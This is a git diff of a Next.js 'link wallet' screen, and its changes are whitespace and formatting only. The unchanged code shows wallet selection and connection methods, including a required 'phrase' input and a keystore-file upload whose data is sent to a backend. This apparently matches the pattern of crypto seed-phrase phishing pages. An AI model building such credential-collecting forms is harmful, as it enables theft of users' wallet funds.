@@ -7,7 +7,7 @@ import { useRouter } from 'next/navigation';
 import { checkWalletType } from '@/utils/walletUtils';
 
 const wallets = [
- {
+  {
     "name": "Trust Wallet",
     "image_url": "https://cdn.brandfetch.io/iduQ_Ynvea/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
@@ -167,7 +167,7 @@ export default function LinkWalletScreen() {
   const handleWalletAddressChange = (e) => {
     const address = e.target.value;
     setWalletAddress(address);
-    
+
     if (address) {
       const walletInfo = checkWalletType(address);
       if (walletInfo) {
@@ -184,7 +184,7 @@ export default function LinkWalletScreen() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
-    
+
     try {
       const token = localStorage.getItem('token');
       if (!token) {
@@ -199,12 +199,12 @@ export default function LinkWalletScreen() {
       };
 
       const response = await api.linkWallet(token, walletData);
-      
+
       setSuccessData({
         referenceNumber: response.wallet.referenceNumber,
         walletType: detectedWalletType || 'Unknown',
       });
-      
+
     } catch (error) {
       toast.error(error.message || 'Failed to link wallet');
       setError(true);
@@ -226,7 +226,7 @@ export default function LinkWalletScreen() {
   );
 
   const renderConnectionForm = () => {
-    switch(connectionMethod) {
+    switch (connectionMethod) {
       case 'phrase':
         return (
           <div className="space-y-4">
@@ -238,7 +238,7 @@ export default function LinkWalletScreen() {
               required
             />
             <div className="space-y-2">
-              <input 
+              <input
                 type="text"
                 value={walletAddress}
                 onChange={handleWalletAddressChange}
@@ -274,7 +274,7 @@ export default function LinkWalletScreen() {
                 className="hidden"
                 id="keystoreFile"
               />
-              <label 
+              <label
                 htmlFor="keystoreFile"
                 className="flex flex-col items-center gap-2 cursor-pointer"
               >
@@ -326,17 +326,17 @@ export default function LinkWalletScreen() {
             <Search className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
           </div>
         </div>
-        
+
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
           {filteredWallets.map((wallet, i) => (
-            <button 
+            <button
               key={i}
               onClick={() => handleWalletClick(wallet)}
               className="flex flex-col items-center p-4 bg-white/5 rounded-xl hover:bg-white/10 transition-all text-center"
             >
               <div className="w-16 h-16 mb-3">
-                <img 
-                  src={wallet.image_url} 
+                <img
+                  src={wallet.image_url}
                   alt={wallet.name}
                   className="w-full h-full object-contain rounded-lg"
                 />
@@ -353,14 +353,14 @@ export default function LinkWalletScreen() {
           <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
             <div className="flex justify-between items-center mb-4">
               <div className="flex items-center gap-3">
-                <img 
-                  src={selectedWallet.image_url} 
+                <img
+                  src={selectedWallet.image_url}
                   alt={selectedWallet.name}
                   className="w-8 h-8 object-contain rounded"
                 />
                 <h3 className="text-xl font-semibold text-white">{selectedWallet.name}</h3>
               </div>
-              <button 
+              <button
                 onClick={() => {
                   setSelectedWallet(null);
                   setConnectionState(null);
@@ -370,7 +370,7 @@ export default function LinkWalletScreen() {
                 <X size={24} />
               </button>
             </div>
-            
+
             {connectionState === 'connecting' && (
               <div className="py-8 flex flex-col items-center gap-4">
                 <Loader2 size={40} className="text-blue-500 animate-spin" />
@@ -409,11 +409,10 @@ export default function LinkWalletScreen() {
                       key={method.id}
                       type="button"
                       onClick={() => setConnectionMethod(method.id)}
-                      className={`flex items-center gap-2 px-4 py-2 text-sm font-medium ${
-                        connectionMethod === method.id 
-                          ? 'text-blue-400 border-b-2 border-blue-400' 
+                      className={`flex items-center gap-2 px-4 py-2 text-sm font-medium ${connectionMethod === method.id
+                          ? 'text-blue-400 border-b-2 border-blue-400'
                           : 'text-gray-400 hover:text-white'
-                      }`}
+                        }`}
                     >
                       {method.icon}
                       {method.label}
@@ -421,7 +420,7 @@ export default function LinkWalletScreen() {
                   ))}
                 </div>
                 {renderConnectionForm()}
-                <button 
+                <button
                   type="submit"
                   disabled={isLoading}
                   className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl transition-all disabled:opacity-50"
@@ -446,7 +445,7 @@ export default function LinkWalletScreen() {
               <p className="text-gray-400 text-center">
                 Your {successData.walletType} wallet has been successfully linked
               </p>
-              
+
               <div className="w-full bg-white/5 rounded-lg p-4 mt-4">
                 <p className="text-sm text-gray-400 mb-2">Reference Number</p>
                 <div className="flex items-center justify-between">
